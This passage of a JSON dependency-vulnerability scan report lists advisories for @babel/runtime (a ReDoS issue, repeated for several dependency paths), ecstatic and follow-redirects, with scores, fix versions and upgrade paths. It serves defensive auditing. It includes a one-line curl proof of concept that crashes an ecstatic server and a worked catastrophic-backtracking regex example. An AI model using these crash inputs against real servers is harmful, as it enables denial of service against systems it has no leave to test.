        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/material@5.13.2",
          "react-transition-group@4.4.5",
          "dom-helpers@5.2.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "react-transition-group@4.4.5",
          "dom-helpers@5.2.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "jss-plugin-vendor-prefixer@10.10.0",
          "css-vendor@2.0.8",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-vendor-prefixer@10.10.0",
          "css-vendor@2.0.8",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/material@5.13.2",
          "@mui/system@5.13.2",
          "@mui/private-theming@5.13.1",
          "@mui/utils@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "@mui/system@5.18.0",
          "@mui/private-theming@5.17.1",
          "@mui/utils@5.17.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-ECSTATIC-540354",
        "title": "Denial of Service (DoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C",
        "credit": [
          "Snyk Research"
        ],
        "semver": {
          "vulnerable": [
            "<4.1.4"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.1.4"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "ecstatic",
        "references": [
          {
            "url": "https://github.com/jfhbrook/node-ecstatic/commit/72044b89941ada4a5e864d77257b4efb20aef498",
            "title": "GitHub Commit"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:47:26.699531Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:56:11.671731Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:47:26.699531Z"
          }
        ],
        "description": "## Overview\n[ecstatic](https://www.npmjs.com/package/ecstatic) is a simple static file server middleware. Use it with a raw http server, express/connect or on the CLI.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). It is possible to crash a server using the package due to the way URL params parsing is handled during redirect.\r\n\r\n### PoC\r\n```\r\ncurl --path-as-is $(echo -e -n \"http://127.0.0.1:8080/existing-dir-name?\\x0cfoo\")\r\n```\r\n\r\nIn the PoC the library is trying to redirect `/existing-dir-name?\\x0cfoo` to `/existing-dir-name/?\\x0cfoo` which cause `TypeError: The header content contains invalid characters` error because of `\\x0c` symbol.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `ecstatic` to version 4.1.4 or higher.\n## References\n- [GitHub Commit](https://github.com/jfhbrook/node-ecstatic/commit/72044b89941ada4a5e864d77257b4efb20aef498)\n",
        "epssDetails": {
          "percentile": "0.62205",
          "probability": "0.00436",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2019-10775"
          ],
          "CWE": [
            "CWE-400"
          ],
          "GHSA": [
            "GHSA-9q64-mpxx-87fg",
            "GHSA-jc84-3g44-wf2q"
          ]
        },
        "packageName": "ecstatic",
        "proprietary": true,
        "creationTime": "2019-12-31T12:10:55.651594Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2019-12-31T12:01:40Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2019-12-31T12:01:39Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:47:26.699531Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "@odlux/framework@0.1.4",
          "http-server@0.11.2",
          "ecstatic@3.3.2"
        ],
        "upgradePath": [
          false,
          "http-server@0.13.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "ecstatic",
        "version": "3.3.2"
      },
      {
        "id": "SNYK-JS-FOLLOWREDIRECTS-6141137",
        "title": "Improper Handling of Extra Parameters",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P",
        "credit": [
          "Kim Donggyu"
        ],
        "semver": {
          "vulnerable": [
            "<1.15.4"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "1.15.4"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "follow-redirects",
        "references": [
          {
            "url": "https://github.com/follow-redirects/follow-redirects/issues/235",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/follow-redirects/follow-redirects/pull/236",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvssV3BaseScore": 6.1,
            "modificationTime": "2024-03-11T09:48:50.700729Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvssV3BaseScore": 6.1,
            "modificationTime": "2024-03-11T09:49:56.424424Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-09-18T11:35:11.342543Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:48:50.700729Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 6.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:56.424424Z"
          }
        ],
